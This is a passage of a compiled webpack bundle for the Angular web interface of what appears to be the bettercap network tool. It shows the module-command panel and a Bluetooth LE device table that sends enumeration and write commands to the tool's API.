</table>\n        </div>\n      </div>\n\n    </div>\n\n    <div *ngIf=\"curMod === 1\" class=\"container-fluid shadow-sm\">\n\n      <div class=\"row\">\n        <div class=\"col-12\">\n          <h4>Interfaces</h4>\n\n          <table class=\"table table-sm table-dark\">\n            <tbody>\n              <ng-container *ngFor=\"let iface of api.session.interfaces | search: omnibar.query\">\n                <tr>\n                  <td width=\"1%\" class=\"nowrap\">\n                    <span class=\"badge badge-secondary\" style=\"margin-right: 5px\">{{ iface.name }}</span>   \n                    <small class=\"text-muted\">{{ iface.flags }}</small>\n                  </td>\n                  <td>\n                    <span *ngIf=\"iface.mac != '0'\">\n                      {{ iface.mac | uppercase }} \n                      <small class=\"text-muted\" *ngIf=\"iface.vendor\">{{ iface.vendor }}</small>\n                    </span>\n                  </td>\n                </tr>\n                <tr *ngIf=\"iface.addresses.length == 0\">\n                  <td colspan=\"2\" style=\"padding-left:50px\">\n                    <span class=\"text-muted\">not connected</span>\n                  </td>\n                </tr>\n                <tr *ngFor=\"let a of iface.addresses\">\n                  <td colspan=\"2\" style=\"padding-left:50px\">\n                    {{ a.address }} <small class=\"text-muted\">{{ a.type }}</small>\n                  </td>\n                </tr>\n              </ng-container>\n            </tbody>\n          </table>\n\n        </div>\n      </div>\n\n      <div class=\"row\">\n        <div class=\"col-12\">\n          <h4>Packets per Protocol</h4>\n\n          <table class=\"table table-dark table-sm\">\n            <tbody>\n              <tr *ngFor=\"let proto of session.packets.protos | keyvalue | search: omnibar.query\">\n                <th width=\"10%\">{{ proto.key }}</th>\n                <td>\n                  <ngb-progressbar type=\"info\" [value]=\"proto.value\" [max]=\"pktTot\">\n                    {{ proto.value }}\n                  </ngb-progressbar>\n                </td>\n              </tr>\n            </tbody>\n          </table>\n        </div>\n      </div>\n\n    </div>\n    \n\n\n    <div *ngIf=\"curMod !== 0 && curMod !== 1\" class=\"container-fluid shadow-sm\">\n      <div class=\"row\">\n        <div class=\"col-12\">\n          <p class=\"mod-description\">\n            {{ curMod.description }}\n          </p>\n          <a (click)=\"api.settings.pinToggle(curMod.name)\" \n             ngbTooltip=\"{{ api.settings.isPinned(curMod.name) ? 'Unpin' : 'Pin' }} this module to the navigation bar.\"\n             style=\"cursor:pointer;margin-right: 15px\"\n             >\n            <i class=\"fas fa-thumbtack shadow\" [ngStyle]=\"{'transform': api.settings.isPinned(curMod.name) ? 'rotate(45deg)' : ''}\"></i>\n          </a>\n          <span *ngIf=\"curMod.running\" class=\"badge badge-success\">\n            Running\n          </span> \n          <span *ngIf=\"!curMod.running\" class=\"badge badge-danger\">\n            Not running\n          </span> \n          <hr/>\n        </div>\n      </div>\n\n      <div *ngIf=\"successMessage\" class=\"row\">\n        <div class=\"col-12\">\n          <div class=\"alert alert-dismissable fade show alert-success\" role=\"alert\">\n            {{ successMessage }}\n            <button type=\"button\" class=\"close\" data-dismiss=\"alert\" aria-label=\"Close\">\n              <span aria-hidden=\"true\">&times;</span>\n            </button>\n          </div>\n        </div>\n      </div>\n\n      <div class=\"row\">\n        <div class=\"col-12\">\n          <h4>Commands</h4>\n\n          <p *ngIf=\"(curMod.handlers | json) == '{}'\">No commands available for this module.</p>\n\n          <div *ngFor=\"let cmd of curMod.handlers | search: omnibar.query\" class=\"form-group\">\n            <label>\n              <button class=\"btn btn-sm badge badge-pill badge-warning\" (click)=\"showCommandModal(cmd)\">\n                <i class=\"fas fa-play\"></i>\n                {{cmd.name}}\n              </button>\n            </label>\n            <p class=\"form-text text-muted\">{{ cmd.description }}</p>\n          </div> \n        </div>\n      </div>\n\n      <div class=\"row\">\n        <div class=\"col-12\">\n          <h4>Parameters</h4>\n\n          <p *ngIf=\"(curMod.parameters | json) == '{}'\">No parameters available for this module.</p>\n\n          <div *ngFor=\"let p of curMod.parameters | keyvalue | search: omnibar.query\" class=\"form-group\">\n            <label for=\"{{ p.key }}\">\n              {{p.key}}\n            </label>\n            <p class=\"form-text text-muted\">{{ p.value.description }}</p>\n\n            <div class=\"input-group\">\n              <input \n                 type=\"text\" \n                 class=\"form-control form-control-sm param-input\" \n                 name=\"{{p.key}}\" \n                 id=\"{{p.key}}\" \n                 (keyup.enter)=\"saveParam(p.value)\"\n                 [(ngModel)]=\"p.value.current_value\" />\n\n              <div class=\"input-group-append\">\n                <button class=\"btn btn-sm btn-dark\" type=\"button\" (click)=\"saveParam(p.value)\">\n                  <i class=\"far fa-save\"></i>\n                </button>\n              </div>\n            </div>\n\n          </div> \n        </div>\n      </div>\n    </div>\n\n  </div>\n</div>\n\n<div id=\"commandModal\" class=\"modal fade\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"commandModalTitle\" [ngModel]=\"curCmd\" name=\"fieldName\" ngDefaultControl>\n  <div class=\"modal-dialog\" role=\"document\">\n    <div class=\"modal-content\">\n      <div class=\"modal-header\">\n        <div class=\"modal-title\" id=\"commandModalTitle\">\n          <h6>{{ curCmd.name }}</h6>\n        </div>\n        <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-label=\"Close\">\n          <span aria-hidden=\"true\">&times;</span>\n        </button>\n      </div>\n      <div class=\"modal-body\">\n        <form (ngSubmit)=\"doRunCommand()\">\n          <p class=\"form-text text-muted\">\n            {{ curCmd.description }}\n          </p>\n          <div *ngFor=\"let token of curCmd.tokens\" class=\"form-group\">\n            <label for=\"tok{{ token.id }}\">{{ token.label }}</label>\n            <input type=\"text\" id=\"tok{{ token.id }}\" class=\"form-control param-input\" value=\"\">\n          </div>\n          <div class=\"text-right\">\n            <button type=\"submit\" class=\"btn btn-sm btn-warning\">\n              <i class=\"fas fa-play\"></i> Run\n            </button> \n          </div>\n        </form>\n      </div>\n    </div>\n  </div>\n</div>\n"

/***/ }),

/***/ "./src/app/components/advanced/advanced.component.scss":
/*!*************************************************************!*\
  !*** ./src/app/components/advanced/advanced.component.scss ***!
  \*************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "*.nav-link {\n  cursor: pointer;\n}\n\n.nav-pills .nav-link {\n  border-radius: none;\n  border: none;\n  color: #fff;\n  font-size: 15px;\n  background-color: #32383e;\n}\n\n.nav-pills .nav-link.active, .nav-pills .show > .nav-link {\n  border-radius: 0;\n  border: none;\n  color: #aaa;\n  background-color: #212529;\n}\n\n.mod-nav {\n  margin-right: 0;\n  padding-right: 0;\n}\n\np.mod-description {\n  font-size: 1rem;\n}\n\ndiv.mod-content {\n  padding-top: 12px;\n  background-color: #212529;\n  color: #fff;\n}\n\ninput.param-input {\n  background-color: #333;\n  border: 1px solid #353535;\n  color: #aaa;\n}\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIi9Vc2Vycy9ldmlsc29ja2V0L0JhaGFtdXQvTGFiL2JldHRlcmNhcC91aS9zcmMvYXBwL2NvbXBvbmVudHMvYWR2YW5jZWQvYWR2YW5jZWQuY29tcG9uZW50LnNjc3MiLCJzcmMvYXBwL2NvbXBvbmVudHMvYWR2YW5jZWQvYWR2YW5jZWQuY29tcG9uZW50LnNjc3MiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6IkFBQUE7RUFDSSxlQUFBO0FDQ0o7O0FERUE7RUFDSSxtQkFBQTtFQUNBLFlBQUE7RUFDQSxXQUFBO0VBQ0EsZUFBQTtFQUNBLHlCQUFBO0FDQ0o7O0FERUE7RUFDSSxnQkFBQTtFQUNBLFlBQUE7RUFDQSxXQUFBO0VBQ0EseUJBQUE7QUNDSjs7QURHQTtFQUNJLGVBQUE7RUFDQSxnQkFBQTtBQ0FKOztBREdBO0VBQ0ksZUFBQTtBQ0FKOztBREdBO0VBQ0ksaUJBQUE7RUFDQSx5QkFBQTtFQUNBLFdBQUE7QUNBSjs7QURHQTtFQUNJLHNCQUFBO0VBQ0EseUJBQUE7RUFDQSxXQUFBO0FDQUoiLCJmaWxlIjoic3JjL2FwcC9jb21wb25lbnRzL2FkdmFuY2VkL2FkdmFuY2VkLmNvbXBvbmVudC5zY3NzIiwic291cmNlc0NvbnRlbnQiOlsiKi5uYXYtbGluayB7XG4gICAgY3Vyc29yOiBwb2ludGVyO1xufVxuXG4ubmF2LXBpbGxzIC5uYXYtbGluayB7XG4gICAgYm9yZGVyLXJhZGl1czogbm9uZTtcbiAgICBib3JkZXI6IG5vbmU7XG4gICAgY29sb3I6ICNmZmY7XG4gICAgZm9udC1zaXplOiAxNXB4O1xuICAgIGJhY2tncm91bmQtY29sb3I6ICMzMjM4M2U7XG59XG5cbi5uYXYtcGlsbHMgLm5hdi1saW5rLmFjdGl2ZSwgLm5hdi1waWxscyAuc2hvdz4ubmF2LWxpbmsge1xuICAgIGJvcmRlci1yYWRpdXM6IDA7XG4gICAgYm9yZGVyOiBub25lO1xuICAgIGNvbG9yOiAjYWFhO1xuICAgIGJhY2tncm91bmQtY29sb3I6ICMyMTI1Mjk7XG59XG5cblxuLm1vZC1uYXYge1xuICAgIG1hcmdpbi1yaWdodDogMDtcbiAgICBwYWRkaW5nLXJpZ2h0OiAwO1xufVxuXG5wLm1vZC1kZXNjcmlwdGlvbiB7XG4gICAgZm9udC1zaXplOiAxcmVtO1xufVxuXG5kaXYubW9kLWNvbnRlbnQge1xuICAgIHBhZGRpbmctdG9wOiAxMnB4O1xuICAgIGJhY2tncm91bmQtY29sb3I6ICMyMTI1Mjk7XG4gICAgY29sb3I6ICNmZmY7XG59XG5cbmlucHV0LnBhcmFtLWlucHV0IHtcbiAgICBiYWNrZ3JvdW5kLWNvbG9yOiMzMzM7IFxuICAgIGJvcmRlcjogMXB4IHNvbGlkICMzNTM1MzU7IFxuICAgIGNvbG9yOiAjYWFhO1xufVxuIiwiKi5uYXYtbGluayB7XG4gIGN1cnNvcjogcG9pbnRlcjtcbn1cblxuLm5hdi1waWxscyAubmF2LWxpbmsge1xuICBib3JkZXItcmFkaXVzOiBub25lO1xuICBib3JkZXI6IG5vbmU7XG4gIGNvbG9yOiAjZmZmO1xuICBmb250LXNpemU6IDE1cHg7XG4gIGJhY2tncm91bmQtY29sb3I6ICMzMjM4M2U7XG59XG5cbi5uYXYtcGlsbHMgLm5hdi1saW5rLmFjdGl2ZSwgLm5hdi1waWxscyAuc2hvdyA+IC5uYXYtbGluayB7XG4gIGJvcmRlci1yYWRpdXM6IDA7XG4gIGJvcmRlcjogbm9uZTtcbiAgY29sb3I6ICNhYWE7XG4gIGJhY2tncm91bmQtY29sb3I6ICMyMTI1Mjk7XG59XG5cbi5tb2QtbmF2IHtcbiAgbWFyZ2luLXJpZ2h0OiAwO1xuICBwYWRkaW5nLXJpZ2h0OiAwO1xufVxuXG5wLm1vZC1kZXNjcmlwdGlvbiB7XG4gIGZvbnQtc2l6ZTogMXJlbTtcbn1cblxuZGl2Lm1vZC1jb250ZW50IHtcbiAgcGFkZGluZy10b3A6IDEycHg7XG4gIGJhY2tncm91bmQtY29sb3I6ICMyMTI1Mjk7XG4gIGNvbG9yOiAjZmZmO1xufVxuXG5pbnB1dC5wYXJhbS1pbnB1dCB7XG4gIGJhY2tncm91bmQtY29sb3I6ICMzMzM7XG4gIGJvcmRlcjogMXB4IHNvbGlkICMzNTM1MzU7XG4gIGNvbG9yOiAjYWFhO1xufSJdfQ== */"

/***/ }),

/***/ "./src/app/components/advanced/advanced.component.ts":
/*!***********************************************************!*\
  !*** ./src/app/components/advanced/advanced.component.ts ***!
  \***********************************************************/
/*! exports provided: AdvancedComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "AdvancedComponent", function() { return AdvancedComponent; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _angular_router__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! @angular/router */ "./node_modules/@angular/router/fesm5/router.js");
/* harmony import */ var _services_api_service__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ../../services/api.service */ "./src/app/services/api.service.ts");
/* harmony import */ var _services_sort_service__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ../../services/sort.service */ "./src/app/services/sort.service.ts");
/* harmony import */ var _services_omnibar_service__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! ../../services/omnibar.service */ "./src/app/services/omnibar.service.ts");
/* harmony import */ var _environments_environment__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! ../../../environments/environment */ "./src/environments/environment.ts");







var AdvancedComponent = /** @class */ (function () {
    function AdvancedComponent(api, sortService, route, omnibar) {
        this.api = api;
        this.sortService = sortService;
        this.route = route;
        this.omnibar = omnibar;
        this.modules = [];
        this.environment = _environments_environment__WEBPACK_IMPORTED_MODULE_6__["environment"];
        this.successMessage = '';
        this.curTab = 0;
        this.curMod = 0;
        this.curCmd = {
            name: '',
            description: '',
            parser: '',
            tokens: []
        };
        this.pktTot = 0;
        this.update(this.api.session);
    }
    AdvancedComponent.prototype.ngOnInit = function () {
        var _this = this;
        this.route.paramMap.subscribe(function (params) {
            _this.curMod = _this.api.module(params.get("module")) || _this.curMod;
        });
        var modname = this.route.snapshot.paramMap.get("module");
        if (modname) {
            this.curMod = this.api.module(modname) || this.curMod;
        }
        this.api.onNewData.subscribe(function (session) {
            _this.update(session);
        });
    };
    AdvancedComponent.prototype.ngOnDestroy = function () {
    };
    AdvancedComponent.prototype.saveParam = function (param) {
        this.successMessage = '';
        var val = param.current_value;
        if (param.validator != "") {
            var validator = new RegExp(param.validator);
            if (validator.test(val) == false) {
                this.api.onCommandError.emit({
                    error: "Value " + val +
                        " is not valid for parameter '" + param.name +
                        "' (validator: '" + param.validator + "')"
                });
                return;
            }
        }
        if (val == "") {
            val = '""';
        }
        this.api.cmd("set " + param.name + " " + val);
        this.successMessage = "Parameter " + param.name + " successfully updated.";
    };
    AdvancedComponent.prototype.showCommandModal = function (cmd) {
        /*
         * Command handlers can be in the form of:
         *
         * cmd.name on
         *
         * in which case we can just go ahead and run it, or:
         *
         * cmd.name PARAM OPTIONAL?
         *
         * in which case we need input from the user.
         */
        this.curCmd = cmd;
        this.curCmd.tokens = cmd.name
            .replace(', ', ',') // make lists a single item
            .split(' ') // split by space
            .filter(function (token) { return (token == token.toUpperCase()); }) // only select the uppercase tokens
            .map(function (token) { return ({
            // replace stuff that can be bad for html attributes
            label: token.replace(/[^A-Z0-9_,]+/g, " ").trim(),
            id: token.replace(/[\W_]+/g, ""),
        }); });
        if (this.curCmd.tokens.length == 0) {
            this.api.cmd(this.curCmd.name);
        }
        else {
            $('#commandModal').modal('show');
        }
    };
    AdvancedComponent.prototype.doRunCommand = function () {
        var compiled = this.curCmd.name.split(' ')[0];
        var tokens = this.curCmd.tokens;
        for (var i = 0; i < tokens.length; i++) {
            var val = $('#tok' + tokens[i].id).val();
            compiled += ' ' + (val == "" ? '""' : val);
        }
        $('#commandModal').modal('hide');
        this.api.cmd(compiled);
    };
    AdvancedComponent.prototype.update = function (session) {
        if (this.curMod !== 0 && this.curMod !== 1) {
            this.curMod.running = this.api.module(this.curMod.name).running;
        }
        this.sortService.sort(session.modules, {
            field: 'name',
            direction: 'desc',
            type: ''
        });
        this.pktTot = 0;
        for (var proto in session.packets.Protos) {
            this.pktTot += session.packets.Protos[proto];
        }
        this.session = session;
        this.modules = session.modules;
    };
    AdvancedComponent = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Component"])({
            selector: 'ui-advanced',
            template: __webpack_require__(/*! ./advanced.component.html */ "./src/app/components/advanced/advanced.component.html"),
            styles: [__webpack_require__(/*! ./advanced.component.scss */ "./src/app/components/advanced/advanced.component.scss")]
        }),
        tslib__WEBPACK_IMPORTED_MODULE_0__["__metadata"]("design:paramtypes", [_services_api_service__WEBPACK_IMPORTED_MODULE_3__["ApiService"], _services_sort_service__WEBPACK_IMPORTED_MODULE_4__["SortService"], _angular_router__WEBPACK_IMPORTED_MODULE_2__["ActivatedRoute"], _services_omnibar_service__WEBPACK_IMPORTED_MODULE_5__["OmniBarService"]])
    ], AdvancedComponent);
    return AdvancedComponent;
}());



/***/ }),

/***/ "./src/app/components/alive.pipe.ts":
/*!******************************************!*\
  !*** ./src/app/components/alive.pipe.ts ***!
  \******************************************/
/*! exports provided: AlivePipe */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "AlivePipe", function() { return AlivePipe; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");


var AlivePipe = /** @class */ (function () {
    function AlivePipe() {
    }
    AlivePipe.prototype.transform = function (item, ms) {
        var now = new Date().getTime(), seen = new Date(item.last_seen).getTime();
        return (now - seen) <= ms;
    };
    AlivePipe = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Pipe"])({ name: 'alive' })
    ], AlivePipe);
    return AlivePipe;
}());



/***/ }),

/***/ "./src/app/components/ble-table/ble-table.component.html":
/*!***************************************************************!*\
  !*** ./src/app/components/ble-table/ble-table.component.html ***!
  \***************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<div class=\"table-responsive\">\n  <table class=\"table table-dark table-sm\">\n    <thead>\n      <tr>\n        <th style=\"width:1%\" sortable-column=\"rssi\" sort-direction=\"asc\">RSSI</th>\n        <th style=\"width:1%\" class=\"nowrap\" sortable-column=\"mac\">MAC</th>\n        <th sortable-column=\"name\">Name</th>\n        <th sortable-column=\"vendor\">Vendor</th>\n        <th sortable-column=\"flags\">Flags</th>\n        <th style=\"width:1%\" sortable-column=\"connectable\">Connectable</th>\n        <th style=\"width:1%\" sortable-column=\"services\">Services</th>\n        <th style=\"width:1%\" class=\"nowrap\" sortable-column=\"last_seen\">Seen</th>\n      </tr>\n    </thead>\n    <tbody>\n\n      <tr *ngIf=\"devices.length == 0\">\n        <td colspan=\"7\" align=\"center\">\n          <i>empty</i>\n        </td>\n      </tr>\n\n      <ng-container *ngFor=\"let device of devices | search: omnibar.query\">\n        <tr *ngIf=\"!currDev || currDev.mac == device.mac\" [class.alive]=\"device | alive:100\">\n          <td>\n            <ui-signal-indicator [signalstrength]=\"device.rssi\"></ui-signal-indicator>\n          </td>\n          <td>\n            <div ngbDropdown [open]=\"visibleMenu == device.mac\">\n              <button class=\"btn btn-sm btn-dark btn-action\" ngbDropdownToggle (click)=\"visibleMenu = (visibleMenu == device.mac ? null : device.mac)\">\n                {{ device.mac | uppercase }}\n              </button>\n              <div ngbDropdownMenu class=\"menu-dropdown\">\n                <ul>\n                  <li>\n                    <a (click)=\"visibleMenu = null; clipboard.copy(device.mac.toUpperCase())\">Copy</a>\n                  </li>\n                  <li>\n                    <a (click)=\"visibleMenu = null; setAlias(device)\">Set Alias</a>\n                  </li>\n                </ul>\n              </div>\n            </div>\n          </td>\n          \n          <td [class.empty]=\"!device.name && !device.alias\">\n            {{ (device.name ? device.name : device.alias ? '' : 'none') | unbash }}\n            <span *ngIf=\"device.alias\" (click)=\"setAlias(device)\" class=\"badge badge-pill badge-secondary\" style=\"cursor:pointer;\">\n              {{ device.alias }}\n            </span>\n          </td>\n\n          <td [class.empty]=\"!device.vendor\">{{ device.vendor ? device.vendor : 'unknown' }}</td>\n          <td [class.empty]=\"!device.flags\">{{ device.flags ? device.flags : 'none' }}</td>\n          <td align=\"center\">\n            <i class=\"fas fa-check\" *ngIf=\"device.connectable\" style=\"color:green\"></i>\n            <i class=\"fas fa-times\" *ngIf=\"!device.connectable\" style=\"color:red\"></i>\n          </td>\n          <td align=\"center\">\n            <span *ngIf=\"currScan && device.services.length == 0\" class=\"badge badge-warning\">\n              <span *ngIf=\"currScan.mac == device.mac\" ngbTooltip=\"Scanning ...\">\n                <span class=\"spinner-border spinner-border-sm\" role=\"status\" aria-hidden=\"true\"></span>\n              </span>\n              <span *ngIf=\"currScan.mac != device.mac\" ngbTooltip=\"Another device is being scanned ...\">\n                <i class=\"fas fa-eye\"></i>\n              </span>\n            </span>\n\n            <span *ngIf=\"device.services.length > 0\">\n              <span style=\"cursor:pointer;\" class=\"badge badge-danger\" (click)=\"currDev = (currDev ? null : device)\">\n                {{ device.services.length }}\n                <i *ngIf=\"!currDev\" class=\"fas fa-angle-right\"></i>\n                <i *ngIf=\"currDev && currDev.mac == device.mac\" class=\"fas fa-angle-down\"></i>\n              </span>\n            </span>\n\n            <span *ngIf=\"!currScan\" style=\"cursor:pointer; margin-left:5px\" class=\"badge badge-warning\" (click)=\"enumServices(device)\">\n              <i *ngIf=\"device.services.length == 0\" ngbTooltip=\"Scan\" class=\"fas fa-eye\"></i>\n              <i *ngIf=\"device.services.length > 0\" ngbTooltip=\"Refresh\" class=\"fas fa-sync-alt\"></i>\n            </span>\n          </td>\n          <td class=\"time\">{{ device.last_seen | date: 'HH:mm:ss' }}</td>\n        </tr>\n      </ng-container>\n    </tbody>\n  </table>\n\n  <table *ngIf=\"currDev\" class=\"table table-sm table-dark\">\n    <thead>\n      <tr>\n        <th>Handles</th>\n        <th>\n          <span class=\"badge badge-primary\" style=\"margin-right: 10px\">\n          Service\n          </span>\n          <i class=\"fas fa-chevron-right\"></i>\n          <span class=\"badge badge-secondary\" style=\"margin-left: 10px\">\n          Characteristics\n          </span>\n        </th>\n        <th>Properties</th>\n        <th>Data</th>\n        <th width=\"1%\"></th>\n      </tr>\n    </thead>\n    <tbody>\n      <ng-container *ngFor=\"let svc of currDev.services\">\n      <tr>\n        <td>\n          {{ svc.handle }}\n          <i class=\"fas fa-chevron-right\"></i>\n          {{ svc.end_handle }}\n        </td>\n        <td>\n          <span *ngIf=\"svc.name\">\n            <span class=\"badge badge-primary\" style=\"margin-right: 10px\">\n              {{ svc.name }}\n            </span>\n            <span class=\"text-muted\">{{ svc.uuid }}</span>\n          </span>\n          <span *ngIf=\"!svc.name\" class=\"badge badge-primary\">\n            {{ svc.uuid }}\n          </span>\n        </td>\n        <td></td>\n        <td></td>\n      </tr>\n      <tr *ngFor=\"let ch of svc.characteristics\">\n        <td style=\"padding-left:50px\">\n          <span class=\"text-muted\">{{ ch.handle }}</span>\n        </td>\n        <td style=\"padding-left:50px\"> \n          <span *ngIf=\"ch.name\">\n            <span class=\"badge badge-secondary\" style=\"margin-right: 10px\">\n              {{ ch.name }}\n            </span>\n            <span class=\"text-muted\">{{ ch.uuid }}</span>\n          </span>\n          <span *ngIf=\"!ch.name\" class=\"badge badge-secondary\">\n            {{ ch.uuid }}\n          </span>\n        </td>\n        <td>\n          {{ ch.properties.join(', ') | unbash }}\n        </td>\n        <td>\n          <span class=\"text-muted\">\n            {{ ch.data | unbash }}\n          </span>\n        </td>\n        <td>\n          <button *ngIf=\"ch.properties.join().indexOf('WRITE') != -1\" class=\"btn btn-sm btn-warning\" ngbTooltip=\"Write\" (click)=\"showWriteModal(currDev, ch)\">\n            write\n          </button>\n        </td>\n      </tr>\n      </ng-container>\n    </tbody>\n  </table>\n</div>\n\n<div id=\"writeModal\" class=\"modal fade\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"writeModalTitle\">\n  <div class=\"modal-dialog\" role=\"document\">\n    <div class=\"modal-content\">\n      <div class=\"modal-header\">\n        <div class=\"modal-title\" id=\"writeModalTitle\">\n          <h5>Write Data</h5>\n        </div>\n        <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-label=\"Close\">\n          <span aria-hidden=\"true\">&times;</span>\n        </button>\n      </div>\n      <div class=\"modal-body\">\n        <form (ngSubmit)=\"doWrite()\">\n          <div class=\"form-group row\">\n            <label for=\"writeMAC\" class=\"col-sm-1 col-form-label\">MAC</label>\n            <div class=\"col-sm\">\n              <input type=\"text\" class=\"form-control\" id=\"writeMAC\" value=\"\">\n            </div>\n          </div>\n          <div class=\"form-group row\">\n            <label for=\"writeUUID\" class=\"col-sm-1 col-form-label\">UUID</label>\n            <div class=\"col-sm\">\n              <input type=\"text\" class=\"form-control\" id=\"writeUUID\" value=\"\">\n            </div>\n          </div>\n          <div class=\"form-group row\">\n            <label for=\"writeData\" class=\"col-sm-1 col-form-label\">Data</label>\n            <div class=\"col-sm\">\n              <input type=\"text\" class=\"form-control\" id=\"writeData\" value=\"\">\n            </div>\n          </div>\n          <div class=\"text-right\">\n            <button type=\"submit\" class=\"btn btn-dark\">Write</button>\n          </div>\n        </form>\n      </div>\n    </div>\n  </div>\n</div>\n\n<div id=\"inputModal\" class=\"modal fade\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"inputModalTitle\">\n  <div class=\"modal-dialog\" role=\"document\">\n    <div class=\"modal-content\">\n      <div class=\"modal-header\">\n        <div class=\"modal-title\">\n          <h5 id=\"inputModalTitle\"></h5>\n        </div>\n        <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-label=\"Close\">\n          <span aria-hidden=\"true\">&times;</span>\n        </button>\n      </div>\n      <div class=\"modal-body\">\n        <form (ngSubmit)=\"doSetAlias()\">\n          <div class=\"form-group row\">\n            <div class=\"col\">\n              <input type=\"text\" class=\"form-control param-input\" id=\"in\" value=\"\">\n              <input type=\"hidden\" id=\"inhost\" value=\"\">\n            </div>\n          </div>\n          <div class=\"text-right\">\n            <button type=\"submit\" class=\"btn btn-dark\">Ok</button>\n          </div>\n        </form>\n      </div>\n    </div>\n  </div>\n</div>\n"

/***/ }),

/***/ "./src/app/components/ble-table/ble-table.component.scss":
/*!***************************************************************!*\
  !*** ./src/app/components/ble-table/ble-table.component.scss ***!
  \***************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6IiIsImZpbGUiOiJzcmMvYXBwL2NvbXBvbmVudHMvYmxlLXRhYmxlL2JsZS10YWJsZS5jb21wb25lbnQuc2NzcyJ9 */"

/***/ }),

/***/ "./src/app/components/ble-table/ble-table.component.ts":
/*!*************************************************************!*\
  !*** ./src/app/components/ble-table/ble-table.component.ts ***!
  \*************************************************************/
/*! exports provided: BleTableComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "BleTableComponent", function() { return BleTableComponent; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _services_sort_service__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ../../services/sort.service */ "./src/app/services/sort.service.ts");
/* harmony import */ var _services_api_service__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ../../services/api.service */ "./src/app/services/api.service.ts");
/* harmony import */ var _services_omnibar_service__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ../../services/omnibar.service */ "./src/app/services/omnibar.service.ts");
/* harmony import */ var _services_clipboard_service__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! ../../services/clipboard.service */ "./src/app/services/clipboard.service.ts");






var BleTableComponent = /** @class */ (function () {
    function BleTableComponent(api, sortService, omnibar, clipboard) {
        this.api = api;
        this.sortService = sortService;
        this.omnibar = omnibar;
        this.clipboard = clipboard;
        this.devices = [];
        this.visibleMenu = "";
        this.currDev = null;
        this.currScan = null;
        this.sort = { field: 'rssi', direction: 'asc', type: '' };
        this.update(this.api.session);
    }
    BleTableComponent.prototype.ngOnInit = function () {
        var _this = this;
        this.api.onNewData.subscribe(function (session) {
            _this.update(session);
        });
        this.sortSub = this.sortService.onSort.subscribe(function (event) {
            _this.sort = event;
            _this.sortService.sort(_this.devices, event);
        });
    };
    BleTableComponent.prototype.ngOnDestroy = function () {
        this.sortSub.unsubscribe();
    };
    BleTableComponent.prototype.setAlias = function (dev) {
        $('#in').val(dev.alias);
        $('#inhost').val(dev.mac);
        $('#inputModalTitle').html('Set alias for ' + dev.mac);
        $('#inputModal').modal('show');
    };
    BleTableComponent.prototype.doSetAlias = function () {
        $('#inputModal').modal('hide');
        var mac = $('#inhost').val();
        var alias = $('#in').val();
        if (alias.trim() == "")
            alias = '""';
        this.api.cmd("alias " + mac + " " + alias);
    };
    BleTableComponent.prototype.enumServices = function (dev) {
        this.currScan = dev;
        this.api.cmd('ble.enum ' + dev.mac);
    };
    BleTableComponent.prototype.showWriteModal = function (dev, ch) {
        $('#writeMAC').val(dev.mac);
        $('#writeUUID').val(ch.uuid);
        $('#writeData').val("FFFFFF");
        $('#writeModal').modal('show');
    };
    BleTableComponent.prototype.doWrite = function () {
        var mac = $('#writeMAC').val();
        var uuid = $('#writeUUID').val();
        var data = $('#writeData').val();
        $('#writeModal').modal('hide');
        this.api.cmd("ble.write " + mac + " " + uuid + " " + data);
    };
    BleTableComponent.prototype.update = function (session) {
        this.currScan = this.api.module('ble.recon').state.scanning;
        // freeze the interface while the user is doing something
